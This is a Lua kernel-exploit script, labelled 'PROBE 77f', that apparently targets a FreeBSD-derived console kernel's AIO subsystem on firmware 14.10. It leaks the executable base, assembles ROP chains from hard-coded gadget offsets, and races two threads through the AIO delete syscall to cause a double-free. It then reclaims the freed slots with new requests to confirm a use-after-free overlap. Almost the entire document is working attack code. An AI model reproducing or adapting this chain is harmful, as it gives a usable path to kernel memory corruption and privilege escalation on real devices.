-- CRASH_CLASS: HIGH
-- PROBE 77f: prolapse full chain — drain + race + same-type reclaim + overlap detect
--
-- The 662-vs-662 double-STATUS (65l) IS a double-free: the D exclusive lock
-- serializes entry_dispose but both threads pass through sequentially.
-- Thread A frees the object, Thread B frees it AGAIN (dangling).
-- 14.20 adds generation-ID recheck after lock; 14.10 doesn't have it.
--
-- Strategy:
--   1. Pre-drain: submit+poll+delete 200 AIO to warm the zone
--   2. Submit 16 fresh AIO, poll them all to completed state
--   3. Race-delete with 2 children (proven pattern from 65l)
--   4. After double-free: submit NEW AIO requests
--      - The double-freed slot is on the UMA free list TWICE
--      - Two new submits get the SAME kernel memory
--   5. Delete one → the other's object is freed while still "alive"
--   6. Submit replacement → reclaim freed slot with new data
--   7. Poll the dangling ID → if status differs, we have overlap proof

print("=== PROBE 77f: PROLAPSE FULL CHAIN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- /dev/zero for completing AIO reads
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

-- NOTE: DO NOT call mk(670) here — it permanently poisons the 662 delete path

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))            -- offset 0
    wq(N(reqs) + 8, uint64(16))       -- nbytes = 16
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)  -- buf
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)  -- result
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)  -- fd
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end

-- ============================================================
-- PHASE 0: Pre-drain AIO zone (warm the allocator, cycle objects)
-- ============================================================
print("")
print("[0] PRE-DRAIN: cycle 128 AIO objects")
local drain_ok = 0
for i = 1, 128 do
    local id = submit_one()
    if id ~= 0 then
        poll_one(id)
        delete_one(id)
        drain_ok = drain_ok + 1
    end
end
print(string.format("  cycled %d objects", drain_ok))

-- ============================================================
-- PHASE 1: RACE + RECLAIM (30 iterations)
-- ============================================================
print("")
print("[1] RACE + SAME-TYPE RECLAIM (30 iters × 16 IDs)")

local BATCH = 16
local ITERS = 30
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)

local total_doubles = 0
local total_anomalies = 0
local total_kptrs = 0
local overlap_details = {}

for iter = 1, ITERS do
    if not alive() then print(string.format("  iter %d: DEAD", iter)); break end

    -- Submit BATCH AIO on /dev/zero → complete immediately
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            ids[#ids + 1] = id
        end
    end
    if #ids < 4 then print("  too few IDs: " .. #ids); break end
    local count = #ids

    -- Set up race buffers
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0)); wq(N(marker_B), uint64(0))

    -- Build child A ROP chain
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0x41414141))
    emA(g_pop_rdi); emA(uint64(N(marker_A))); emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662)); emA(stub)
    emA(g_pop_rdi); emA(uint64(0)); emA(g_pop_rax); emA(uint64(431)); emA(stub)

    -- Build child B ROP chain
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0x42424242))
    emB(g_pop_rdi); emB(uint64(N(marker_B))); emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662)); emB(stub)
    emB(g_pop_rdi); emB(uint64(0)); emB(g_pop_rax); emB(uint64(431)); emB(stub)

    -- thr_new params
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A)); wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0)); wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B)); wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0)); wq(N(par_B) + 0x30, tB)

    -- Launch both children
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait for children to finish
    for w = 1, 50000 do local _ = rd(sb_A) end

    -- Check double-free status
    local doubles = 0
    local double_indices = {}
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then
            doubles = doubles + 1
            double_indices[#double_indices + 1] = i + 1
        end
    end
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        print(string.format("  iter %d: *** %d DOUBLE-FREE ***", iter, doubles))

        -- RECLAIM: Submit new AIO requests to grab the double-freed slots
        -- Each double-freed slot is on the free list twice, so two new submits
        -- will get the SAME kernel memory.
        local reclaim_ids = {}
        local reclaim_n = doubles * 4 + 16  -- overshoot
        for r = 1, reclaim_n do
            local id = submit_one()
            if id ~= 0 then
                poll_one(id)
                reclaim_ids[#reclaim_ids + 1] = id
            end
        end
        print(string.format("    reclaimed %d new IDs", #reclaim_ids))

        -- DANGLING POINTER TEST:
        -- If two IDs share the same kernel object, deleting one frees the object.
        -- The other ID now points to freed memory.
        -- Polling the dangling ID should show anomalous status.
        if #reclaim_ids >= 4 then
            -- Delete half the reclaimed IDs
            local dangling_candidates = {}
            for r = 1, #reclaim_ids, 2 do
                local st = delete_one(reclaim_ids[r])
                -- The odd-numbered IDs are kept alive (potential danglers)
                if r + 1 <= #reclaim_ids then
                    dangling_candidates[#dangling_candidates + 1] = reclaim_ids[r + 1]
                end
            end

            -- Submit replacement objects to overwrite freed slots
            local replacements = {}
            for r = 1, #dangling_candidates + 4 do
                local id = submit_one()
                if id ~= 0 then
                    poll_one(id)
                    replacements[#replacements + 1] = id
                end
            end

            -- Poll the dangling candidates — if they read from replacement data,
            -- we have overlap confirmation
            for r = 1, #dangling_candidates do
                local st = poll_one(dangling_candidates[r])
                -- Normal completed = 0x00000003
                -- Deleted = 0x80020003
                -- If we see a DIFFERENT status, the object was overwritten
                if st ~= 3 and st ~= 0x00010003 and st ~= 0x80020003 and st ~= 0xDEAD then
                    total_anomalies = total_anomalies + 1
                    local detail = string.format("iter=%d id=0x%X status=0x%08X",
                        iter, dangling_candidates[r], st)
                    overlap_details[#overlap_details + 1] = detail
                    print(string.format("    *** ANOMALY: %s ***", detail))
                end
            end

            -- Cleanup replacements
            for r = 1, #replacements do delete_one(replacements[r]) end
            -- Cleanup remaining dangling candidates
            for r = 1, #dangling_candidates do
                pcall(function() delete_one(dangling_candidates[r]) end)
            end
        end
    else
        if iter <= 3 or iter == ITERS then
            print(string.format("  iter %d: no double", iter))
        elseif iter == 4 then print("  ...") end
    end
end

print("")
print("[SUMMARY]")
print(string.format("  race iters:    %d", ITERS))
print(string.format("  double frees:  %d", total_doubles))
print(string.format("  ANOMALIES:     %d", total_anomalies))
print(string.format("  kernel ptrs:   %d", total_kptrs))
print(string.format("  process:       %s", alive() and "ALIVE" or "DEAD"))

if total_anomalies > 0 then
    print("")
    print("*** OVERLAP CONFIRMED — dangling pointer reads anomalous status ***")
    for i = 1, #overlap_details do print("  " .. overlap_details[i]) end
end

if total_doubles > 0 and total_anomalies == 0 then
    print("")
    print("Race hits but no overlap via same-type reclaim.")
    print("Possible: generation check prevents reuse of same slot,")
    print("or entry_dispose only runs once despite double status=0.")
end

print("")
print("=== 77f COMPLETE ===")
